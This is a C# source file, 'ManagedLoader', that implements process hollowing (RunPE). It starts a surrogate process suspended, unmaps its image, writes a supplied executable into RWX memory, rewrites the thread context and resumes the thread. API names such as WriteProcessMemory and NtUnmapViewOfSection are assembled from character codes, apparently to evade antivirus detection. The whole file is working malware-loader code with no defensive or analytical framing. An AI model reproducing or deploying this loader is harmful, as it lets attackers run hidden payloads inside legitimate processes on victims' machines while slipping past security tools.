﻿/*
==============================================================================
Copyright © Jason Tanner (Antebyte)

All rights reserved.

The MIT License (MIT)

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

Except as contained in this notice, the name of the above copyright holder
shall not be used in advertising or otherwise to promote the sale, use or
other dealings in this Software without prior written authorization.
==============================================================================
*/

#region Imports

using System;
using System.Text;
using System.Runtime.InteropServices;

#endregion
namespace MemoryMapper
{
    public class ManagedLoader
    {
        #region  Variables

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        internal static extern IntPtr LoadLibraryA([In, MarshalAs(UnmanagedType.LPStr)] string lpFileName);
        [DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        delegate bool ESS(string appName, StringBuilder commandLine, IntPtr procAttr, IntPtr thrAttr, [MarshalAs(UnmanagedType.Bool)] bool inherit, int creation, IntPtr env, string curDir, byte[] sInfo, IntPtr[] pInfo);
        delegate bool EXT(IntPtr hThr, uint[] ctxt);
        delegate bool TEX(IntPtr t, uint[] c); //all kernel32
        delegate uint ION(IntPtr hProc, IntPtr baseAddr); //ntdll
        delegate bool ORY(IntPtr hProc, IntPtr baseAddr, ref IntPtr bufr, int bufrSize, ref IntPtr numRead);
        delegate uint EAD(IntPtr hThread); //kernel32.dll
        delegate IntPtr CEX(IntPtr hProc, IntPtr addr, IntPtr size, int allocType, int prot);
        delegate bool CTEX(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, ref uint lpflOldProtect);
        delegate bool MOR(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out int lpNumberOfBytesWritten); //kernel32.dll
        delegate bool OP(byte[] bytes, string surrogateProcess);

        #endregion
        #region Methods

        /// <summary>
        /// Loads an assembly into memory from bytes using a running process.
        /// </summary>
        /// <param name="bytes">The bytes of the assembly to inject.</param>
        /// <param name="surrogateProcess">The path of the process to inject the assembly.</param>
        public bool LoadAssembly(byte[] bytes, string surrogateProcess)
        {
            ManagedLoader loader = new ManagedLoader();
            OP inject = new OP(loader.Inject);
            bool loaded = inject(bytes, surrogateProcess);
            return loaded;
        }

        private bool Inject(byte[] bytes, string surrogateProcess)
        {
            String K32 = Convert.ToString((char)107) + (char)101 + (char)114 + (char)110 + (char)101 + (char)108 + (char)51 + (char)50;
            String NTD = Convert.ToString((char)110) + (char)116 + (char)100 + (char)108 + (char)108;
            ESS CP = CreateAPI<ESS>(K32, Convert.ToString((char)67) + (char)114 + (char)101 + (char)97 + (char)116 + (char)101 + (char)80 + (char)114 + (char)111 + (char)99 + (char)101 + (char)115 + (char)115 + (char)65);
            ION NUVS = CreateAPI<ION>(NTD, Convert.ToString((char)78) + (char)116 + (char)85 + (char)110 + (char)109 + (char)97 + (char)112 + (char)86 + (char)105 + (char)101 + (char)119 + (char)79 + (char)102 + (char)83 + (char)101 + (char)99 + (char)116 + (char)105 + (char)111 + (char)110);
            EXT GTC = CreateAPI<EXT>(K32, Convert.ToString((char)71) + (char)101 + (char)116 + (char)84 + (char)104 + (char)114 + (char)101 + (char)97 + (char)100 + (char)67 + (char)111 + (char)110 + (char)116 + (char)101 + (char)120 + (char)116);
            TEX STC = CreateAPI<TEX>(K32, Convert.ToString((char)83) + (char)101 + (char)116 + (char)84 + (char)104 + (char)114 + (char)101 + (char)97 + (char)100 + (char)67 + (char)111 + (char)110 + (char)116 + (char)101 + (char)120 + (char)116);
            ORY RPM = CreateAPI<ORY>(K32, Convert.ToString((char)82) + (char)101 + (char)97 + (char)100 + (char)80 + (char)114 + (char)111 + (char)99 + (char)101 + (char)115 + (char)115 + (char)77 + (char)101 + (char)109 + (char)111 + (char)114 + (char)121);
            EAD RT = CreateAPI<EAD>(K32, Convert.ToString((char)82) + (char)101 + (char)115 + (char)117 + (char)109 + (char)101 + (char)84 + (char)104 + (char)114 + (char)101 + (char)97 + (char)100);
            CEX VAE = CreateAPI<CEX>(K32, Convert.ToString((char)86) + (char)105 + (char)114 + (char)116 + (char)117 + (char)97 + (char)108 + (char)65 + (char)108 + (char)108 + (char)111 + (char)99 + (char)69 + (char)120);
            CTEX VPE = CreateAPI<CTEX>(K32, Convert.ToString((char)86) + (char)105 + (char)114 + (char)116 + (char)117 + (char)97 + (char)108 + (char)80 + (char)114 + (char)111 + (char)116 + (char)101 + (char)99 + (char)116 + (char)69 + (char)120);
            MOR WPM = CreateAPI<MOR>(K32, Convert.ToString((char)87) + (char)114 + (char)105 + (char)116 + (char)101 + (char)80 + (char)114 + (char)111 + (char)99 + (char)101 + (char)115 + (char)115 + (char)77 + (char)101 + (char)109 + (char)111 + (char)114 + (char)121);
            try
            {
                IntPtr procAttr = IntPtr.Zero;
                IntPtr[] processInfo = new IntPtr[4];
                byte[] startupInfo = new byte[0x44];
                int num2 = BitConverter.ToInt32(bytes, 60);
                int num = BitConverter.ToInt16(bytes, num2 + 6);
                IntPtr ptr4 = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x54));
                if (CP(null, new StringBuilder(surrogateProcess), procAttr, procAttr, false, 4, procAttr, null, startupInfo, processInfo))
                {
                    uint[] ctxt = new uint[0xb3];
                    ctxt[0] = 0x10002;
                    if (GTC(processInfo[1], ctxt))
                    {
                        IntPtr baseAddr = new IntPtr(ctxt[0x29] + 8L);
                        IntPtr buffer = IntPtr.Zero;
                        IntPtr bufferSize = new IntPtr(4);
                        IntPtr numRead = IntPtr.Zero;
                        if (RPM(processInfo[0], baseAddr, ref buffer, (int)bufferSize, ref numRead) && (NUVS(processInfo[0], buffer) == 0))
                        {
                            IntPtr addr = new IntPtr(BitConverter.ToInt32(bytes, num2 + 0x34));
                            IntPtr size = new IntPtr(BitConverter.ToInt32(bytes, num2 + 80));
                            IntPtr lpBaseAddress = VAE(processInfo[0], addr, size, 0x3000, 0x40);
                            int lpNumberOfBytesWritten;
                            WPM(processInfo[0], lpBaseAddress, bytes, (uint)((int)ptr4), out lpNumberOfBytesWritten);
                            int num5 = num - 1;
                            for (int i = 0; i <= num5; i++)
                            {
                                int[] dst = new int[10];
                                Buffer.BlockCopy(bytes, (num2 + 0xf8) + (i * 40), dst, 0, 40);
                                byte[] buffer2 = new byte[(dst[4] - 1) + 1];
                                Buffer.BlockCopy(bytes, dst[5], buffer2, Convert.ToInt32(null, 2), buffer2.Length);
                                size = new IntPtr(lpBaseAddress.ToInt32() + dst[3]);
                                addr = new IntPtr(buffer2.Length);
                                WPM(processInfo[0], size, buffer2, (uint)addr, out lpNumberOfBytesWritten);
                            }
                            size = new IntPtr(ctxt[0x29] + 8L);
                            addr = new IntPtr(4);
                            WPM(processInfo[0], size, BitConverter.GetBytes(lpBaseAddress.ToInt32()), (uint)addr, out lpNumberOfBytesWritten);
                            ctxt[0x2c] = (uint)(lpBaseAddress.ToInt32() + BitConverter.ToInt32(bytes, num2 + 40));
                            STC(processInfo[1], ctxt);
                        }
                    }
                    RT(processInfo[1]);
                }
            }
            catch
            {
                return false;
            }
            return true;
        }

        private T CreateAPI<T>(string name, string method)
        {
            return (T)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(name), method), typeof(T));
        }

        #endregion
    }
}
